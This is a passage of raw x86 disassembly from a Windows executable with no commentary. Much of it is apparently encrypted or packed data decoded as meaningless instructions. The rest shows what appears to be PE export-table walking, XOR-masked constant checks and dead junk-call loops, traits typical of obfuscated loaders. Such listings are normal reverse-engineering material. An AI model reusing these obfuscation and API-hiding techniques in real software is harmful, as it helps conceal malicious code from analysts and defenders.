  40e465:	xchg   ecx,eax
  40e466:	stos   BYTE PTR es:[edi],al
  40e467:	inc    edx
  40e468:	add    esi,DWORD PTR [edx+0x2aa6d6c3]
  40e46e:	out    dx,al
  40e46f:	lock loop 0x40e4e9
  40e472:	and    DWORD PTR [edi+ebp*8+0x13],ebx
  40e476:	rol    DWORD PTR [ecx+0x5825a8f8],cl
  40e47c:	es push es
  40e47e:	dec    esp
  40e47f:	test   DWORD PTR [esi-0x1439371c],esp
  40e485:	int3   
  40e486:	in     eax,dx
  40e487:	out    dx,eax
  40e488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e489:	addr16 push di
  40e48c:	sub    BYTE PTR [esi-0x17],0x5a
  40e490:	out    dx,al
  40e491:	add    ecx,esp
  40e493:	sahf   
  40e494:	inc    edx
  40e495:	mov    ecx,0xf252d325
  40e49a:	jl     0x40e4e3
  40e49c:	into   
  40e49d:	(bad)  
  40e49f:	mov    ch,0x9d
  40e4a1:	xor    eax,0x2d74f90a
  40e4a6:	add    eax,0xf57bd740
  40e4ab:	xor    BYTE PTR [ebx+0x7f],0xbd
  40e4af:	inc    esp
  40e4b0:	and    DWORD PTR [edi+0x4341134b],0x2f
  40e4b7:	or     DWORD PTR [edi-0x40],0x8835746c
  40e4be:	call   0xda1:0xd9f42023
  40e4c5:	jp     0x40e4f6
  40e4c7:	call   0x5a6a3f8f
  40e4cc:	pop    edi
  40e4cd:	adc    BYTE PTR [ecx-0x26af1db],al
  40e4d3:	lahf   
  40e4d4:	pop    ebx
  40e4d5:	inc    esi
  40e4d6:	jmp    0x86659a9
  40e4db:	cdq    
  40e4dc:	int    0xee
  40e4de:	mov    BYTE PTR [esp+ebp*1+0x195a2e75],dh
  40e4e5:	ds push ebp
  40e4e7:	ret    0x4bce
  40e4ea:	ja     0x40e508
  40e4ec:	in     al,0xc0
  40e4ee:	ins    DWORD PTR es:[edi],dx
  40e4ef:	pop    ds
  40e4f0:	mov    gs,WORD PTR [eax+0x58]
  40e4f3:	int    0x67
  40e4f5:	ja     0x40e522
  40e4f7:	cmp    al,0x1d
  40e4f9:	mov    ah,BYTE PTR [ebx]
  40e4fb:	out    dx,al
  40e4fc:	dec    edx
  40e4fd:	cmp    BYTE PTR [edi-0x5f],cl
  40e500:	dec    ebx
  40e501:	and    DWORD PTR [eax+0x4c],esp
  40e504:	test   BYTE PTR [ebp+0x30],dh
  40e507:	aad    0xde
  40e509:	je     0x40e506
  40e50b:	inc    edx
  40e50c:	sub    BYTE PTR [esi-0x11],dh
  40e50f:	and    al,0xeb
  40e511:	popa   
  40e512:	shr    DWORD PTR [ebx+0x421b4f42],cl
  40e518:	out    dx,eax
  40e519:	sbb    eax,0x7f7e9b06
  40e51e:	or     al,0x79
  40e520:	pop    edi
  40e521:	jle    0x40e577
  40e523:	jne    0x40e512
  40e525:	ins    DWORD PTR es:[edi],dx
  40e526:	mov    ebp,0xcc04f852
  40e52b:	mov    ds:0xf57028ef,al
  40e530:	aas    
  40e531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e532:	bound  ebx,QWORD PTR [esi-0xd]
  40e535:	(bad)  
  40e536:	in     eax,dx
  40e537:	aad    0x89
  40e539:	leave  
  40e53a:	pop    ecx
  40e53b:	gs daa 
  40e53d:	xor    al,0x53
  40e53f:	pop    edx
  40e540:	stos   DWORD PTR es:[edi],eax
  40e541:	popf   
  40e542:	popa   
  40e543:	push   0x1e
  40e545:	retf   
  40e546:	push   ss
  40e547:	add    BYTE PTR [edi-0x14],ah
  40e54a:	inc    ebx
  40e54b:	sbb    bh,al
  40e54d:	lea    esi,ds:0x6ced2553
  40e553:	(bad)  
  40e555:	mov    bl,0x5e
  40e557:	or     al,0xea
  40e559:	and    ebx,ebx
  40e55b:	cmp    al,0x84
  40e55d:	(bad)  
  40e55e:	clc    
  40e55f:	std    
  40e560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e561:	std    
  40e562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e563:	ja     0x40e5a5
  40e565:	popa   
  40e566:	jmp    0x5584:0xdc287347
  40e56d:	lahf   
  40e56e:	mov    ch,0x67
  40e570:	inc    eax
  40e571:	xor    ebp,0x7f1984d8
  40e577:	push   edx
  40e578:	mov    ah,0xdf
  40e57a:	fcomp  QWORD PTR [ecx+0x6]
  40e57d:	xor    bl,0xc1
  40e580:	or     bh,BYTE PTR [edx]
  40e582:	adc    ecx,DWORD PTR [ecx+0x58]
  40e585:	sti    
  40e586:	push   ss
  40e587:	xor    cl,dh
  40e589:	cmp    eax,0xb5f83910
  40e58e:	mov    bl,0xe8
  40e590:	out    dx,al
  40e591:	push   esp
  40e592:	mov    bh,0xd8
  40e594:	leave  
  40e595:	pop    ecx
  40e596:	xlat   BYTE PTR ds:[ebx]
  40e597:	scas   eax,DWORD PTR es:[edi]
  40e598:	pop    esp
  40e599:	dec    ecx
  40e59a:	bound  eax,QWORD PTR [edi-0x5d]
  40e59d:	aad    0xd4
  40e59f:	aad    0xd5
  40e5a1:	inc    edi
  40e5a2:	push   0xfaefd7a1
  40e5a7:	jge    0x40e5b1
  40e5a9:	pop    ecx
  40e5aa:	test   BYTE PTR [edx-0x42],0xe1
  40e5ae:	test   BYTE PTR [edi+0x38a72ed8],0xaf
  40e5b5:	xchg   edi,eax
  40e5b6:	push   edx
  40e5b7:	test   DWORD PTR [ecx+0x3ff5b9c6],ecx
  40e5bd:	jb     0x40e600
  40e5bf:	int    0x0
  40e5c1:	in     al,dx
  40e5c2:	imul   edx,ebp,0x27
  40e5c5:	mov    ds:0xadeafd73,al
  40e5ca:	(bad)  
  40e5cc:	jle    0x40e5e6
  40e5ce:	add    al,0xc4
  40e5d0:	fwait
  40e5d1:	pop    es
  40e5d2:	fs fwait
  40e5d4:	mov    BYTE PTR [ecx+0x197b90cc],dl
  40e5da:	mov    eax,0xa56accaa
  40e5df:	push   ss
  40e5e0:	rcr    DWORD PTR [edx+eiz*2-0x2d],cl
  40e5e4:	ss std 
  40e5e6:	in     eax,0x13
  40e5e8:	jo     0x40e5e6
  40e5ea:	pop    ds
  40e5eb:	xor    eax,0x68c68a05
  40e5f0:	jmp    FWORD PTR ds:0x35c968e5
  40e5f6:	int3   
  40e5f7:	test   al,0x18
  40e5f9:	jae    0x40e672
  40e5fb:	xchg   ebx,eax
  40e5fc:	ja     0x40e5aa
  40e5fe:	cmp    DWORD PTR [ebx-0x546d7c05],ebp
  40e604:	fsubp  st(5),st
  40e606:	xor    al,0x20
  40e608:	add    al,0x78
  40e60a:	inc    eax
  40e60b:	test   ch,bl
  40e60d:	pop    es
  40e60e:	pop    eax
  40e60f:	out    dx,eax
  40e610:	and    eax,DWORD PTR [ecx+0x5f]
  40e613:	sub    eax,0x5baed17a
  40e618:	test   eax,0x725ee1d6
  40e61d:	pop    ecx
  40e61e:	push   ds
  40e61f:	lds    ebp,FWORD PTR [esi+0x525e7a70]
  40e625:	and    BYTE PTR [esi+0x6f],0x73
  40e629:	imul   edi,DWORD PTR [ecx+0x1b6ea3a8],0xee7e8e2a
  40e633:	aas    
  40e634:	arpl   WORD PTR [eax-0x20f847c0],di
  40e63a:	lahf   
  40e63b:	sub    DWORD PTR [ebx+0x42d53552],0xffffffbc
  40e642:	push   ebx
  40e643:	fidivr WORD PTR [edi+0x7a15b647]
  40e649:	cli    
  40e64a:	ins    DWORD PTR es:[edi],dx
  40e64b:	jae    0x40e6c1
  40e64d:	xchg   edi,eax
  40e64e:	fwait
  40e64f:	stos   BYTE PTR es:[edi],al
  40e650:	xchg   BYTE PTR [edi-0x2384845c],al
  40e656:	xchg   ebp,eax
  40e657:	lahf   
  40e658:	int    0x4d
  40e65a:	sbb    eax,0x4f8e6bda
  40e65f:	lods   eax,DWORD PTR ds:[esi]
  40e660:	jg     0x40e6aa
  40e662:	or     ebx,edi
  40e664:	dec    esp
  40e665:	shr    BYTE PTR [edx+0x78],cl
  40e668:	stos   DWORD PTR es:[edi],eax
  40e669:	sbb    ah,cl
  40e66b:	fidivr DWORD PTR [ebx]
  40e66d:	out    0xdb,al
  40e66f:	ins    DWORD PTR es:[edi],dx
  40e670:	aam    0x82
  40e672:	fldcw  WORD PTR [ebp-0x72c37327]
  40e678:	mov    ebp,0x1636d3ce
  40e67d:	cmp    dh,bl
  40e67f:	add    al,0xb1
  40e681:	ret    
  40e682:	sub    BYTE PTR [ecx-0x50],ah
  40e685:	rcl    ah,0xbe
  40e688:	fwait
  40e689:	mov    al,ds:0x6d6005b4
  40e68e:	pop    ds
  40e68f:	and    DWORD PTR [esi+0x7c12ba8c],ebx
  40e695:	mov    dh,0xbe
  40e697:	shr    BYTE PTR [ecx+eiz*1],0xb
  40e69b:	push   edi
  40e69c:	fild   DWORD PTR [edi]
  40e69e:	aaa    
  40e69f:	aas    
  40e6a0:	jge    0x40e62b
  40e6a2:	int    0x52
  40e6a4:	xchg   esp,eax
  40e6a5:	mov    eax,0xf386a51d
  40e6aa:	adc    eax,0xdab33910
  40e6af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6b0:	mov    esi,0x5605721f
  40e6b5:	in     eax,0xa1
  40e6b7:	dec    ebx
  40e6b8:	adc    BYTE PTR [eax+0x21],dh
  40e6bb:	jae    0x40e6ed
  40e6bd:	in     al,0x7d
  40e6bf:	dec    ecx
  40e6c0:	push   ecx
  40e6c1:	pop    edi
  40e6c2:	loopne 0x40e72c
  40e6c4:	fst    st(3)
  40e6c6:	out    0x78,eax
  40e6c8:	cmp    edx,eax
  40e6ca:	push   eax
  40e6cb:	pop    ss
  40e6cc:	mov    edx,0x399e549f
  40e6d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6d2:	rcl    DWORD PTR [esi],0x9f
  40e6d5:	ins    BYTE PTR es:[edi],dx
  40e6d6:	js     0x40e66e
  40e6d8:	ja     0x428bcccc
  40e6de:	stos   BYTE PTR es:[edi],al
  40e6df:	push   0x649f7e10
  40e6e4:	popf   
  40e6e5:	outs   dx,DWORD PTR ds:[esi]
  40e6e6:	ins    BYTE PTR es:[edi],dx
  40e6e7:	lea    esp,[edx+0x5f]
  40e6ea:	daa    
  40e6eb:	mov    edi,0xb3cab9af
  40e6f0:	dec    esp
  40e6f1:	(bad)  
  40e6f2:	jmp    0x40e6f7
  40e6f4:	pop    ss
  40e6f5:	out    0xd,al
  40e6f7:	pop    ecx
  40e6f8:	add    al,0x59
  40e6fa:	dec    DWORD PTR [esi*2+0x7ab7e5b8]
  40e701:	pop    esi
  40e702:	pop    ebx
  40e703:	cmc    
  40e704:	xchg   BYTE PTR [ebp+0x71],al
  40e707:	in     al,dx
  40e708:	mov    edx,0x4a94246
  40e70d:	xchg   esi,eax
  40e70e:	iret   
  40e70f:	popf   
  40e710:	das    
  40e711:	xchg   DWORD PTR [edi+edi*1],esi
  40e714:	pop    ebx
  40e715:	xor    ch,BYTE PTR [edi]
  40e717:	in     al,0x9
  40e719:	mov    WORD PTR [ebx+0x37],es
  40e71c:	(bad)  
  40e71d:	repz mov esp,?
  40e720:	lea    edi,[edi+0xb]
  40e723:	and    edi,0xffffffea
  40e726:	aad    0x5e
  40e728:	dec    edi
  40e729:	or     BYTE PTR [ebp-0x4e28ce78],dl
  40e72f:	sbb    al,0xa0
  40e731:	pop    edx
  40e732:	adc    al,0x35
  40e734:	sub    al,0x40
  40e736:	push   ebp
  40e737:	outs   dx,BYTE PTR ds:[esi]
  40e738:	jnp    0x40e74c
  40e73a:	dec    ebp
  40e73b:	sar    DWORD PTR [edx-0x1a],1
  40e73e:	push   DWORD PTR [ebp+0x76b4f262]
  40e744:	aad    0x29
  40e746:	mov    bh,0x4d
  40e748:	out    0xfa,al
  40e74a:	xor    eax,DWORD PTR [ecx+esi*2]
  40e74d:	xor    eax,0xf07855c2
  40e752:	sbb    dl,BYTE PTR [edi]
  40e754:	jle    0x40e764
  40e756:	pop    eax
  40e757:	sub    DWORD PTR [esi+0x9],esp
  40e75a:	jne    0x40e74c
  40e75c:	js     0x40e6f3
  40e75e:	cmp    ebx,DWORD PTR [esi]
  40e760:	sbb    cl,bl
  40e762:	dec    edx
  40e763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e764:	jo     0x40e76a
  40e766:	addr16 addr16 pop ecx
  40e769:	jp     0x40e7e1
  40e76b:	inc    esp
  40e76c:	repnz mov BYTE PTR [ebx+eax*2-0x1],0xe
  40e772:	dec    esp
  40e773:	imul   ebp,edi,0x8d4cd1b3
  40e779:	dec    ecx
  40e77a:	jb     0x40e762
  40e77c:	push   ax
  40e77e:	push   ds
  40e77f:	xor    ecx,edi
  40e781:	sub    ebx,DWORD PTR [eax-0x414ad28a]
  40e787:	inc    edi
  40e788:	adc    BYTE PTR [esi],dh
  40e78a:	or     al,0x7c
  40e78c:	in     al,0xa0
  40e78e:	loop   0x40e725
  40e790:	mov    bl,0xfa
  40e792:	hlt    
  40e793:	xchg   BYTE PTR [edx-0x3b],cl
  40e796:	out    dx,al
  40e797:	sub    DWORD PTR [edx+0x1f],ecx
  40e79a:	mov    esi,0x7b32b3f9
  40e79f:	jnp    0x40e81d
  40e7a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7a2:	pop    DWORD PTR [eax+0x6f]
  40e7a5:	dec    ecx
  40e7a6:	jbe    0x40e77c
  40e7a8:	in     eax,dx
  40e7a9:	div    DWORD PTR [ecx]
  40e7ab:	sti    
  40e7ac:	jecxz  0x40e7f4
  40e7ae:	xchg   ebp,eax
  40e7af:	jb     0x40e774
  40e7b1:	test   eax,0xe107d1e7
  40e7b6:	out    dx,eax
  40e7b7:	(bad)  
  40e7b8:	imul   ebx,esi,0xffffff8a
  40e7bb:	jno    0x40e804
  40e7bd:	add    al,0xf9
  40e7bf:	ret    
  40e7c0:	jbe    0xf2904011
  40e7c6:	mov    ebx,0x7ad9888f
  40e7cb:	sar    BYTE PTR [eax-0x62038cef],0xb7
  40e7d2:	fidiv  WORD PTR [eax+0x2e]
  40e7d5:	pusha  
  40e7d6:	lods   al,BYTE PTR ds:[esi]
  40e7d7:	call   0xcbc14b62
  40e7dc:	js     0x40e7f3
  40e7de:	jmp    0x40e787
  40e7e0:	xchg   BYTE PTR [ebp+0xa],bl
  40e7e3:	fild   DWORD PTR [ecx+0x2bdf64e1]
  40e7e9:	icebp  
  40e7ea:	aas    
  40e7eb:	pop    edx
  40e7ec:	ret    0xd01d
  40e7ef:	sub    eax,0x243f3c4c
  40e7f4:	xor    dh,ah
  40e7f6:	mov    dl,0x83
  40e7f8:	mov    cs,WORD PTR [edi+0x26]
  40e7fb:	mov    DWORD PTR [esi],ecx
  40e7fd:	mov    edx,0x5b269120
  40e802:	push   esp
  40e803:	add    DWORD PTR [ecx-0x5a86648a],ebx
  40e809:	iret   
  40e80a:	sahf   
  40e80b:	add    dl,BYTE PTR [edx-0x71]
  40e80e:	gs into 
  40e810:	(bad)  
  40e811:	mov    BYTE PTR [edi-0x674b2b82],dl
  40e817:	les    ebx,FWORD PTR [ecx+ecx*1]
  40e81a:	dec    esi
  40e81b:	popa   
  40e81c:	loop   0x40e808
  40e81e:	aas    
  40e81f:	loopne 0x40e7bb
  40e821:	xlat   BYTE PTR ds:[ebx]
  40e822:	popa   
  40e823:	mov    ecx,0x1beed942
  40e828:	shr    BYTE PTR [ecx+ebp*8-0x53],0x6d
  40e82d:	pop    esi
  40e82e:	xchg   ecx,eax
  40e82f:	shl    DWORD PTR [edi+0x15],1
  40e832:	loopne 0x40e84d
  40e834:	ins    BYTE PTR es:[edi],dx
  40e835:	mov    ch,0xd7
  40e837:	push   edi
  40e838:	jns    0x40e80e
  40e83a:	mov    bl,0xd1
  40e83c:	xchg   ecx,eax
  40e83d:	add    ebx,DWORD PTR [ebx]
  40e83f:	and    al,0xea
  40e841:	adc    DWORD PTR [ebx+esi*1],ebx
  40e844:	outs   dx,BYTE PTR ds:[esi]
  40e845:	and    eax,0x518b02a2
  40e84a:	mov    eax,0xb0a9fb70
  40e84f:	jge    0x40e889
  40e851:	ror    edx,0xff
  40e854:	dec    edi
  40e855:	ret    
  40e856:	or     eax,0x5b309b99
  40e85b:	sbb    bh,BYTE PTR [edi+0x23]
  40e85e:	inc    esi
  40e85f:	xor    ecx,DWORD PTR [esi-0x280057e3]
  40e865:	cdq    
  40e866:	loopne 0x40e8ab
  40e868:	adc    al,0xeb
  40e86a:	rol    DWORD PTR [esi+ecx*8],cl
  40e86d:	inc    esi
  40e86e:	mov    ds:0x5b2d67e1,eax
  40e873:	cmp    edi,esp
  40e875:	xor    DWORD PTR [ecx],esi
  40e877:	mov    eax,0x135fbb90
  40e87c:	ja     0x40e887
  40e87e:	jne    0x40e886
  40e880:	push   edi
  40e881:	cmp    ecx,esp
  40e883:	adc    BYTE PTR [edi+0x6aeb430a],bh
  40e889:	stc    
  40e88a:	sub    eax,0x8a967c07
  40e88f:	push   0xffffffac
  40e891:	lahf   
  40e892:	sub    DWORD PTR [esp+eax*4+0x7dc9616d],0xfffffffa
  40e89a:	pusha  
  40e89b:	sbb    DWORD PTR [ecx],0x5
  40e89e:	push   edi
  40e89f:	jno    0x40e8f5
  40e8a1:	mov    dh,0x68
  40e8a3:	and    al,0x29
  40e8a5:	stos   BYTE PTR es:[edi],al
  40e8a6:	lods   al,BYTE PTR ds:[esi]
  40e8a7:	sub    al,0x77
  40e8a9:	sbb    BYTE PTR [ebx],al
  40e8ab:	mov    ds:0xbf3aa7e5,al
  40e8b0:	sub    BYTE PTR [edi-0x506f4e5],0x26
  40e8b7:	sti    
  40e8b8:	push   cs
  40e8b9:	mov    edx,ebx
  40e8bb:	xor    BYTE PTR [esi],ah
  40e8bd:	pop    ebp
  40e8be:	mov    db2,edi
  40e8c1:	push   ds
  40e8c2:	sbb    BYTE PTR [esi+ebx*8-0x31],bl
  40e8c6:	push   es
  40e8c7:	retf   
  40e8c8:	pop    edx
  40e8c9:	das    
  40e8ca:	dec    eax
  40e8cb:	pop    ecx
  40e8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8cd:	fld    DWORD PTR [esi+0x5a0a01fc]
  40e8d3:	inc    edx
  40e8d4:	sub    dh,BYTE PTR [ebx-0x38684f0d]
  40e8da:	dec    esi
  40e8db:	mov    BYTE PTR ds:0xf4773be7,ah
  40e8e1:	jb     0x40e929
  40e8e3:	xor    eax,0xcba9cabd
  40e8e8:	mov    ch,BYTE PTR [eax+edi*1-0x2ab9aeac]
  40e8ef:	mov    al,0x71
  40e8f1:	lahf   
  40e8f2:	jecxz  0x40e94f
  40e8f4:	enter  0xf681,0x83
  40e8f8:	xor    bl,BYTE PTR [eax+0xd]
  40e8fb:	and    al,0x39
  40e8fd:	in     al,0xcc
  40e8ff:	xlat   BYTE PTR ds:[ebx]
  40e900:	xor    DWORD PTR [si-0x3bb6],eax
  40e905:	xchg   BYTE PTR [ecx+0x4f],dl
  40e908:	or     ebx,DWORD PTR [esi-0x10c9a604]
  40e90e:	push   edx
  40e90f:	inc    edi
  40e910:	mov    ebp,0x423f4176
  40e915:	add    eax,0x6269d656
  40e91a:	or     al,0x9b
  40e91c:	xor    al,bl
  40e91e:	stc    
  40e91f:	and    edi,DWORD PTR [eax]
  40e921:	xchg   esp,eax
  40e922:	pop    eax
  40e923:	sti    
  40e924:	cwde   
  40e925:	xor    ch,bh
  40e927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e928:	xchg   BYTE PTR [ecx+0x22],dh
  40e92b:	out    0x41,al
  40e92d:	pop    ebx
  40e92e:	cmp    eax,0xae19fc47
  40e933:	call   0xbb2:0x38025187
  40e93a:	les    ebx,FWORD PTR [ebx]
  40e93c:	jmp    0x40e964
  40e93e:	mov    ah,0xa8
  40e940:	xor    DWORD PTR [ebx],esp
  40e942:	ror    DWORD PTR [edx-0x188a8d86],1
  40e948:	outs   dx,DWORD PTR ds:[esi]
  40e949:	jb     0x40e983
  40e94b:	mov    dh,0x6d
  40e94d:	je     0x40e980
  40e94f:	fist   WORD PTR [ecx+0x1340086e]
  40e955:	push   0xfffffff2
  40e957:	and    dl,BYTE PTR [edi+0x466f72b2]
  40e95d:	push   0xffffffb6
  40e95f:	(bad)  
  40e960:	in     eax,dx
  40e961:	mov    al,BYTE PTR [edx]
  40e963:	fimul  DWORD PTR ds:0x598b919c
  40e969:	xor    al,BYTE PTR es:[eax+0x51]
  40e96d:	int    0xc6
  40e96f:	pushf  
  40e970:	dec    edi
  40e971:	xchg   edi,eax
  40e972:	mov    bl,0xd3
  40e974:	iret   
  40e975:	cmc    
  40e976:	dec    ecx
  40e977:	call   0x2492:0xc53ca8e7
  40e97e:	mov    al,0xf6
  40e980:	fst    QWORD PTR [edx+0x69]
  40e983:	push   ds
  40e984:	mov    esp,DWORD PTR [esp+edx*8-0x47]
  40e988:	lock loope 0x40e923
  40e98b:	rcr    bl,0x54
  40e98e:	sub    cl,bh
  40e990:	mov    ebx,0x1f9e7212
  40e995:	mov    dh,0xc0
  40e997:	xchg   esi,eax
  40e998:	mov    edi,DWORD PTR [eax+0x3c]
  40e99b:	lea    esi,[edi+esi*8+0x78]
  40e99f:	mov    esi,DWORD PTR [esi+eax*1]
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
